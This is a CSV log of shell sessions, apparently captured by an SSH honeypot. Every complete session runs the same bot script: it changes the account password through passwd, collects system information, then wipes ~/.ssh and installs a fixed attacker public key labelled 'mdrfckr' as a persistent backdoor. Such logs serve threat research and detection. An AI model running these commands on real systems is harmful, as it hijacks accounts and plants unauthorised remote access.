,session,duration,command_freq,input
14229,ae4cd999534a,18.31088185310364,18,cat /proc/cpuinfo | grep name | wc -l
14230,ae4cd999534a,18.31088185310364,18,"echo -e ""kost\nhrNnInfVebmh\nhrNnInfVebmh""|passwd|bash"
14231,ae4cd999534a,18.31088185310364,18,Enter new UNIX password: 
14232,ae4cd999534a,18.31088185310364,18,Enter new UNIX password:
14233,ae4cd999534a,18.31088185310364,18,"echo ""kost\nhrNnInfVebmh\nhrNnInfVebmh\n""|passwd"
14234,ae4cd999534a,18.31088185310364,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14235,ae4cd999534a,18.31088185310364,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14236,ae4cd999534a,18.31088185310364,18,ls -lh $(which ls)
14237,ae4cd999534a,18.31088185310364,18,which ls
14238,ae4cd999534a,18.31088185310364,18,crontab -l
14239,ae4cd999534a,18.31088185310364,18,w
14240,ae4cd999534a,18.31088185310364,18,uname -m
14241,ae4cd999534a,18.31088185310364,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14242,ae4cd999534a,18.31088185310364,18,top
14243,ae4cd999534a,18.31088185310364,18,uname
14244,ae4cd999534a,18.31088185310364,18,uname -a
14245,ae4cd999534a,18.31088185310364,18,lscpu | grep Model
14246,ae4cd999534a,18.31088185310364,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14247,ae45698bcc50,12.28779935836792,18,cat /proc/cpuinfo | grep name | wc -l
14248,ae45698bcc50,12.28779935836792,18,"echo -e ""wagner\n4WrHmTqOBOWt\n4WrHmTqOBOWt""|passwd|bash"
14249,ae45698bcc50,12.28779935836792,18,Enter new UNIX password: 
14250,ae45698bcc50,12.28779935836792,18,Enter new UNIX password:
14251,ae45698bcc50,12.28779935836792,18,"echo ""wagner\n4WrHmTqOBOWt\n4WrHmTqOBOWt\n""|passwd"
14252,ae45698bcc50,12.28779935836792,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14253,ae45698bcc50,12.28779935836792,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14254,ae45698bcc50,12.28779935836792,18,ls -lh $(which ls)
14255,ae45698bcc50,12.28779935836792,18,which ls
14256,ae45698bcc50,12.28779935836792,18,crontab -l
14257,ae45698bcc50,12.28779935836792,18,w
14258,ae45698bcc50,12.28779935836792,18,uname -m
14259,ae45698bcc50,12.28779935836792,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14260,ae45698bcc50,12.28779935836792,18,top
14261,ae45698bcc50,12.28779935836792,18,uname
14262,ae45698bcc50,12.28779935836792,18,uname -a
14263,ae45698bcc50,12.28779935836792,18,lscpu | grep Model
14264,ae45698bcc50,12.28779935836792,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14265,2c2a9cc1639e,17.40708088874817,18,cat /proc/cpuinfo | grep name | wc -l
14266,2c2a9cc1639e,17.40708088874817,18,"echo -e ""qazwsx\nA8IllMIGDaqR\nA8IllMIGDaqR""|passwd|bash"
14267,2c2a9cc1639e,17.40708088874817,18,Enter new UNIX password: 
14268,2c2a9cc1639e,17.40708088874817,18,Enter new UNIX password:
14269,2c2a9cc1639e,17.40708088874817,18,"echo ""qazwsx\nA8IllMIGDaqR\nA8IllMIGDaqR\n""|passwd"
14270,2c2a9cc1639e,17.40708088874817,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14271,2c2a9cc1639e,17.40708088874817,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14272,2c2a9cc1639e,17.40708088874817,18,ls -lh $(which ls)
14273,2c2a9cc1639e,17.40708088874817,18,which ls
14274,2c2a9cc1639e,17.40708088874817,18,crontab -l
14275,2c2a9cc1639e,17.40708088874817,18,w
14276,2c2a9cc1639e,17.40708088874817,18,uname -m
14277,2c2a9cc1639e,17.40708088874817,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14278,2c2a9cc1639e,17.40708088874817,18,top
14279,2c2a9cc1639e,17.40708088874817,18,uname
14280,2c2a9cc1639e,17.40708088874817,18,uname -a
14281,2c2a9cc1639e,17.40708088874817,18,lscpu | grep Model
14282,2c2a9cc1639e,17.40708088874817,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14283,1d651645c121,3.238614559173584,18,cat /proc/cpuinfo | grep name | wc -l
14284,1d651645c121,3.238614559173584,18,"echo -e ""123456\nP4Qvz17VHxs8\nP4Qvz17VHxs8""|passwd|bash"
14285,1d651645c121,3.238614559173584,18,Enter new UNIX password: 
14286,1d651645c121,3.238614559173584,18,Enter new UNIX password:
14287,1d651645c121,3.238614559173584,18,"echo ""123456\nP4Qvz17VHxs8\nP4Qvz17VHxs8\n""|passwd"
14288,1d651645c121,3.238614559173584,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14289,1d651645c121,3.238614559173584,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14290,1d651645c121,3.238614559173584,18,ls -lh $(which ls)
14291,1d651645c121,3.238614559173584,18,which ls
14292,1d651645c121,3.238614559173584,18,crontab -l
14293,1d651645c121,3.238614559173584,18,w
14294,1d651645c121,3.238614559173584,18,uname -m
14295,1d651645c121,3.238614559173584,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14296,1d651645c121,3.238614559173584,18,top
14297,1d651645c121,3.238614559173584,18,uname
14298,1d651645c121,3.238614559173584,18,uname -a
14299,1d651645c121,3.238614559173584,18,lscpu | grep Model
14300,1d651645c121,3.238614559173584,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14301,226c4f7928f2,13.959620237350464,18,cat /proc/cpuinfo | grep name | wc -l
14302,226c4f7928f2,13.959620237350464,18,"echo -e ""daniele123\nOYUkHsjHfSez\nOYUkHsjHfSez""|passwd|bash"
14303,226c4f7928f2,13.959620237350464,18,Enter new UNIX password: 
14304,226c4f7928f2,13.959620237350464,18,Enter new UNIX password:
14305,226c4f7928f2,13.959620237350464,18,"echo ""daniele123\nOYUkHsjHfSez\nOYUkHsjHfSez\n""|passwd"
14306,226c4f7928f2,13.959620237350464,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14307,226c4f7928f2,13.959620237350464,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14308,226c4f7928f2,13.959620237350464,18,ls -lh $(which ls)
14309,226c4f7928f2,13.959620237350464,18,which ls
14310,226c4f7928f2,13.959620237350464,18,crontab -l
14311,226c4f7928f2,13.959620237350464,18,w
14312,226c4f7928f2,13.959620237350464,18,uname -m
14313,226c4f7928f2,13.959620237350464,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14314,226c4f7928f2,13.959620237350464,18,top
14315,226c4f7928f2,13.959620237350464,18,uname
14316,226c4f7928f2,13.959620237350464,18,uname -a
14317,226c4f7928f2,13.959620237350464,18,lscpu | grep Model
14318,226c4f7928f2,13.959620237350464,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14319,70b848a8fd4b,11.490862607955933,18,cat /proc/cpuinfo | grep name | wc -l
14320,70b848a8fd4b,11.490862607955933,18,"echo -e ""12345\nwepTV3ZwxKLc\nwepTV3ZwxKLc""|passwd|bash"
14321,70b848a8fd4b,11.490862607955933,18,Enter new UNIX password: 
14322,70b848a8fd4b,11.490862607955933,18,Enter new UNIX password:
14323,70b848a8fd4b,11.490862607955933,18,"echo ""12345\nwepTV3ZwxKLc\nwepTV3ZwxKLc\n""|passwd"
14324,70b848a8fd4b,11.490862607955933,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14325,70b848a8fd4b,11.490862607955933,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14326,70b848a8fd4b,11.490862607955933,18,ls -lh $(which ls)
14327,70b848a8fd4b,11.490862607955933,18,which ls
14328,70b848a8fd4b,11.490862607955933,18,crontab -l
14329,70b848a8fd4b,11.490862607955933,18,w
14330,70b848a8fd4b,11.490862607955933,18,uname -m
14331,70b848a8fd4b,11.490862607955933,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14332,70b848a8fd4b,11.490862607955933,18,top
14333,70b848a8fd4b,11.490862607955933,18,uname
14334,70b848a8fd4b,11.490862607955933,18,uname -a
14335,70b848a8fd4b,11.490862607955933,18,lscpu | grep Model
14336,70b848a8fd4b,11.490862607955933,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14337,0b812c5b2cab,13.849974870681764,18,cat /proc/cpuinfo | grep name | wc -l
14338,0b812c5b2cab,13.849974870681764,18,"echo -e ""wahab\nw8sBbx3wpK1u\nw8sBbx3wpK1u""|passwd|bash"
14339,0b812c5b2cab,13.849974870681764,18,Enter new UNIX password: 
14340,0b812c5b2cab,13.849974870681764,18,Enter new UNIX password:
14341,0b812c5b2cab,13.849974870681764,18,"echo ""wahab\nw8sBbx3wpK1u\nw8sBbx3wpK1u\n""|passwd"
14342,0b812c5b2cab,13.849974870681764,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14343,0b812c5b2cab,13.849974870681764,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14344,0b812c5b2cab,13.849974870681764,18,ls -lh $(which ls)
14345,0b812c5b2cab,13.849974870681764,18,which ls
14346,0b812c5b2cab,13.849974870681764,18,crontab -l
14347,0b812c5b2cab,13.849974870681764,18,w
14348,0b812c5b2cab,13.849974870681764,18,uname -m
14349,0b812c5b2cab,13.849974870681764,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14350,0b812c5b2cab,13.849974870681764,18,top
14351,0b812c5b2cab,13.849974870681764,18,uname
14352,0b812c5b2cab,13.849974870681764,18,uname -a
14353,0b812c5b2cab,13.849974870681764,18,lscpu | grep Model
14354,0b812c5b2cab,13.849974870681764,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14355,2780782b50e8,13.889544486999512,18,cat /proc/cpuinfo | grep name | wc -l
14356,2780782b50e8,13.889544486999512,18,"echo -e ""qazwsx\n0GDAxUv7BiFJ\n0GDAxUv7BiFJ""|passwd|bash"
14357,2780782b50e8,13.889544486999512,18,Enter new UNIX password: 
14358,2780782b50e8,13.889544486999512,18,Enter new UNIX password:
14359,2780782b50e8,13.889544486999512,18,"echo ""qazwsx\n0GDAxUv7BiFJ\n0GDAxUv7BiFJ\n""|passwd"
14360,2780782b50e8,13.889544486999512,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14361,2780782b50e8,13.889544486999512,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14362,2780782b50e8,13.889544486999512,18,ls -lh $(which ls)
14363,2780782b50e8,13.889544486999512,18,which ls
14364,2780782b50e8,13.889544486999512,18,crontab -l
14365,2780782b50e8,13.889544486999512,18,w
14366,2780782b50e8,13.889544486999512,18,uname -m
14367,2780782b50e8,13.889544486999512,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14368,2780782b50e8,13.889544486999512,18,top
14369,2780782b50e8,13.889544486999512,18,uname
14370,2780782b50e8,13.889544486999512,18,uname -a
14371,2780782b50e8,13.889544486999512,18,lscpu | grep Model
14372,2780782b50e8,13.889544486999512,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14373,c3e8cdf3c96a,11.874475955963137,18,cat /proc/cpuinfo | grep name | wc -l
14374,c3e8cdf3c96a,11.874475955963137,18,"echo -e ""ger\nn3whBgystSfg\nn3whBgystSfg""|passwd|bash"
14375,c3e8cdf3c96a,11.874475955963137,18,Enter new UNIX password: 
14376,c3e8cdf3c96a,11.874475955963137,18,Enter new UNIX password:
14377,c3e8cdf3c96a,11.874475955963137,18,"echo ""ger\nn3whBgystSfg\nn3whBgystSfg\n""|passwd"
14378,c3e8cdf3c96a,11.874475955963137,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14379,c3e8cdf3c96a,11.874475955963137,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14380,c3e8cdf3c96a,11.874475955963137,18,ls -lh $(which ls)
14381,c3e8cdf3c96a,11.874475955963137,18,which ls
14382,c3e8cdf3c96a,11.874475955963137,18,crontab -l
14383,c3e8cdf3c96a,11.874475955963137,18,w
14384,c3e8cdf3c96a,11.874475955963137,18,uname -m
14385,c3e8cdf3c96a,11.874475955963137,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14386,c3e8cdf3c96a,11.874475955963137,18,top
14387,c3e8cdf3c96a,11.874475955963137,18,uname
14388,c3e8cdf3c96a,11.874475955963137,18,uname -a
14389,c3e8cdf3c96a,11.874475955963137,18,lscpu | grep Model
14390,c3e8cdf3c96a,11.874475955963137,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14391,1dcac7ca5f82,7.042239189147949,18,cat /proc/cpuinfo | grep name | wc -l
14392,1dcac7ca5f82,7.042239189147949,18,"echo -e ""jrb\nSTFEXRZxpL00\nSTFEXRZxpL00""|passwd|bash"
14393,1dcac7ca5f82,7.042239189147949,18,Enter new UNIX password: 
14394,1dcac7ca5f82,7.042239189147949,18,Enter new UNIX password:
14395,1dcac7ca5f82,7.042239189147949,18,"echo ""jrb\nSTFEXRZxpL00\nSTFEXRZxpL00\n""|passwd"
14396,1dcac7ca5f82,7.042239189147949,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14397,1dcac7ca5f82,7.042239189147949,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14398,1dcac7ca5f82,7.042239189147949,18,ls -lh $(which ls)
14399,1dcac7ca5f82,7.042239189147949,18,which ls
14400,1dcac7ca5f82,7.042239189147949,18,crontab -l
14401,1dcac7ca5f82,7.042239189147949,18,w
14402,1dcac7ca5f82,7.042239189147949,18,uname -m
14403,1dcac7ca5f82,7.042239189147949,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14404,1dcac7ca5f82,7.042239189147949,18,top
14405,1dcac7ca5f82,7.042239189147949,18,uname
14406,1dcac7ca5f82,7.042239189147949,18,uname -a
14407,1dcac7ca5f82,7.042239189147949,18,lscpu | grep Model
14408,1dcac7ca5f82,7.042239189147949,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14409,9e7daabfa4ff,17.340667009353638,18,cat /proc/cpuinfo | grep name | wc -l
14410,9e7daabfa4ff,17.340667009353638,18,"echo -e ""wahab\nc7QcIpZMCxIZ\nc7QcIpZMCxIZ""|passwd|bash"
14411,9e7daabfa4ff,17.340667009353638,18,Enter new UNIX password: 
14412,9e7daabfa4ff,17.340667009353638,18,Enter new UNIX password:
14413,9e7daabfa4ff,17.340667009353638,18,"echo ""wahab\nc7QcIpZMCxIZ\nc7QcIpZMCxIZ\n""|passwd"
14414,9e7daabfa4ff,17.340667009353638,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14415,9e7daabfa4ff,17.340667009353638,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14416,9e7daabfa4ff,17.340667009353638,18,ls -lh $(which ls)
14417,9e7daabfa4ff,17.340667009353638,18,which ls
14418,9e7daabfa4ff,17.340667009353638,18,crontab -l
14419,9e7daabfa4ff,17.340667009353638,18,w
14420,9e7daabfa4ff,17.340667009353638,18,uname -m
14421,9e7daabfa4ff,17.340667009353638,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14422,9e7daabfa4ff,17.340667009353638,18,top
14423,9e7daabfa4ff,17.340667009353638,18,uname
14424,9e7daabfa4ff,17.340667009353638,18,uname -a
14425,9e7daabfa4ff,17.340667009353638,18,lscpu | grep Model
14426,9e7daabfa4ff,17.340667009353638,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14427,f6027b14d0a2,2.755727529525757,18,cat /proc/cpuinfo | grep name | wc -l
14428,f6027b14d0a2,2.755727529525757,18,"echo -e ""passw0rd\nQKQuZdOA5x7u\nQKQuZdOA5x7u""|passwd|bash"
14429,f6027b14d0a2,2.755727529525757,18,Enter new UNIX password: 
14430,f6027b14d0a2,2.755727529525757,18,Enter new UNIX password:
14431,f6027b14d0a2,2.755727529525757,18,"echo ""passw0rd\nQKQuZdOA5x7u\nQKQuZdOA5x7u\n""|passwd"
14432,f6027b14d0a2,2.755727529525757,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14433,f6027b14d0a2,2.755727529525757,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14434,f6027b14d0a2,2.755727529525757,18,ls -lh $(which ls)
14435,f6027b14d0a2,2.755727529525757,18,which ls
14436,f6027b14d0a2,2.755727529525757,18,crontab -l
14437,f6027b14d0a2,2.755727529525757,18,w
14438,f6027b14d0a2,2.755727529525757,18,uname -m
14439,f6027b14d0a2,2.755727529525757,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14440,f6027b14d0a2,2.755727529525757,18,top
14441,f6027b14d0a2,2.755727529525757,18,uname
14442,f6027b14d0a2,2.755727529525757,18,uname -a
14443,f6027b14d0a2,2.755727529525757,18,lscpu | grep Model
14444,f6027b14d0a2,2.755727529525757,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14445,50c7c308efc8,5.391811847686768,18,cat /proc/cpuinfo | grep name | wc -l
14446,50c7c308efc8,5.391811847686768,18,"echo -e ""chava\nQdLVUmcEVLoi\nQdLVUmcEVLoi""|passwd|bash"
14447,50c7c308efc8,5.391811847686768,18,Enter new UNIX password: 
14448,50c7c308efc8,5.391811847686768,18,Enter new UNIX password:
